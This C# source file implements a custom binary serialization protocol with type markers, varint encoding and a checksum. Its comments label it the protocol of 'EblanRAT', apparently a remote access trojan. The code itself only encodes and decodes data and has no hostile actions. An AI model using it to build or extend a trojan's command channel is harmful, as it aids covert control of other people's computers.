using System;
using System.IO;
using System.Text;
using System.Collections.Generic;

namespace Shared
{
    /// <summary>
    /// EblanRAT custom serialization protocol - incompatible with Liberium
    /// Uses custom binary format with type markers and checksums
    /// </summary>
    public static class EblanProtocol
    {
        private const byte TYPE_NULL = 0x00;
        private const byte TYPE_BOOL = 0x01;
        private const byte TYPE_BYTE = 0x02;
        private const byte TYPE_INT = 0x03;
        private const byte TYPE_LONG = 0x04;
        private const byte TYPE_FLOAT = 0x05;
        private const byte TYPE_DOUBLE = 0x06;
        private const byte TYPE_STRING = 0x07;
        private const byte TYPE_BYTES = 0x08;
        private const byte TYPE_ARRAY = 0x09;
        
        private const uint MAGIC_HEADER = 0x45424C4E; // "EBLN" in hex
        private const byte VERSION = 0x01;

        /// <summary>
        /// Serialize objects to binary format with EblanRAT protocol
        /// </summary>
        public static byte[] Serialize(params object[] objects)
        {
            using var ms = new MemoryStream();
            using var writer = new BinaryWriter(ms);

            // Write magic header and version
            writer.Write(MAGIC_HEADER);
            writer.Write(VERSION);
            
            // Write object count
            WriteVarInt(writer, objects.Length);

            // Write each object
            foreach (var obj in objects)
            {
                WriteObject(writer, obj);
            }

            // Calculate and write checksum
            var data = ms.ToArray();
            var checksum = CalculateChecksum(data);
            writer.Write(checksum);

            return ms.ToArray();
        }

        /// <summary>
        /// Deserialize binary data to object array
        /// </summary>
        public static object[] Deserialize(byte[] data)
        {
            using var ms = new MemoryStream(data);
            using var reader = new BinaryReader(ms);

            // Verify magic header
            var magic = reader.ReadUInt32();
            if (magic != MAGIC_HEADER)
                throw new InvalidDataException("Invalid EblanRAT protocol header");

            // Verify version
            var version = reader.ReadByte();
            if (version != VERSION)
                throw new InvalidDataException($"Unsupported protocol version: {version}");

            // Read object count
            var count = ReadVarInt(reader);
            var objects = new object[count];

            // Read each object
            for (int i = 0; i < count; i++)
            {
                objects[i] = ReadObject(reader);
            }

            // Verify checksum
            var expectedChecksum = reader.ReadUInt32();
            var actualChecksum = CalculateChecksum(data, 0, (int)ms.Position - 4);
            if (expectedChecksum != actualChecksum)
                throw new InvalidDataException("Checksum verification failed");

            return objects;
        }

        private static void WriteObject(BinaryWriter writer, object obj)
        {
            if (obj == null)
            {
                writer.Write(TYPE_NULL);
            }
            else if (obj is bool b)
            {
                writer.Write(TYPE_BOOL);
                writer.Write(b);
            }
            else if (obj is byte bt)
            {
                writer.Write(TYPE_BYTE);
                writer.Write(bt);
            }
            else if (obj is int i)
            {
                writer.Write(TYPE_INT);
                WriteVarInt(writer, i);
            }
            else if (obj is long l)
            {
                writer.Write(TYPE_LONG);
                WriteVarLong(writer, l);
            }
            else if (obj is float f)
            {
                writer.Write(TYPE_FLOAT);
                writer.Write(f);
            }
            else if (obj is double d)
            {
                writer.Write(TYPE_DOUBLE);
                writer.Write(d);
            }
            else if (obj is string s)
            {
                writer.Write(TYPE_STRING);
                var bytes = Encoding.UTF8.GetBytes(s);
                WriteVarInt(writer, bytes.Length);
                writer.Write(bytes);
            }
            else if (obj is byte[] ba)
            {
                writer.Write(TYPE_BYTES);
                WriteVarInt(writer, ba.Length);
                writer.Write(ba);
            }
            else if (obj is Array arr)
            {
                writer.Write(TYPE_ARRAY);
                WriteVarInt(writer, arr.Length);
                foreach (var item in arr)
                {
                    WriteObject(writer, item);
                }
            }
            else
            {
                throw new NotSupportedException($"Type {obj.GetType()} is not supported");
            }
        }

        private static object ReadObject(BinaryReader reader)
        {
            var type = reader.ReadByte();
            
            return type switch
            {
                TYPE_NULL => null,
                TYPE_BOOL => reader.ReadBoolean(),
                TYPE_BYTE => reader.ReadByte(),
                TYPE_INT => ReadVarInt(reader),
                TYPE_LONG => ReadVarLong(reader),
                TYPE_FLOAT => reader.ReadSingle(),
                TYPE_DOUBLE => reader.ReadDouble(),
                TYPE_STRING => ReadString(reader),
                TYPE_BYTES => ReadBytes(reader),
                TYPE_ARRAY => ReadArray(reader),
                _ => throw new InvalidDataException($"Unknown type marker: {type}")
            };
        }

        private static string ReadString(BinaryReader reader)
        {
            var length = ReadVarInt(reader);
            var bytes = reader.ReadBytes(length);
            return Encoding.UTF8.GetString(bytes);
        }

        private static byte[] ReadBytes(BinaryReader reader)
        {
            var length = ReadVarInt(reader);
            return reader.ReadBytes(length);
        }

        private static object[] ReadArray(BinaryReader reader)
        {
            var length = ReadVarInt(reader);
            var array = new object[length];
            for (int i = 0; i < length; i++)
            {
                array[i] = ReadObject(reader);
            }
            return array;
        }

        // Variable-length integer encoding (similar to protobuf varint)
        private static void WriteVarInt(BinaryWriter writer, int value)
        {
            uint uvalue = (uint)value;
            while (uvalue >= 0x80)
            {
                writer.Write((byte)(uvalue | 0x80));
                uvalue >>= 7;
            }
            writer.Write((byte)uvalue);
        }

        private static int ReadVarInt(BinaryReader reader)
        {
            int result = 0;
            int shift = 0;
            byte b;
            
            do
            {
                b = reader.ReadByte();
                result |= (b & 0x7F) << shift;
                shift += 7;
            } while ((b & 0x80) != 0);
            
            return result;
        }

        private static void WriteVarLong(BinaryWriter writer, long value)
        {
            ulong uvalue = (ulong)value;
            while (uvalue >= 0x80)
            {
                writer.Write((byte)(uvalue | 0x80));
                uvalue >>= 7;
            }
            writer.Write((byte)uvalue);
        }

        private static long ReadVarLong(BinaryReader reader)
        {
            long result = 0;
            int shift = 0;
            byte b;
            
            do
            {
                b = reader.ReadByte();
                result |= (long)(b & 0x7F) << shift;
                shift += 7;
            } while ((b & 0x80) != 0);
            
            return result;
        }

        // Simple checksum calculation (CRC32-like)
        private static uint CalculateChecksum(byte[] data, int offset = 0, int length = -1)
        {
            if (length == -1)
                length = data.Length - offset;

            uint checksum = 0xFFFFFFFF;
            for (int i = offset; i < offset + length; i++)
            {
                checksum ^= data[i];
                for (int j = 0; j < 8; j++)
                {
                    if ((checksum & 1) != 0)
                        checksum = (checksum >> 1) ^ 0xEDB88320;
                    else
                        checksum >>= 1;
                }
            }
            return ~checksum;
        }
    }
}
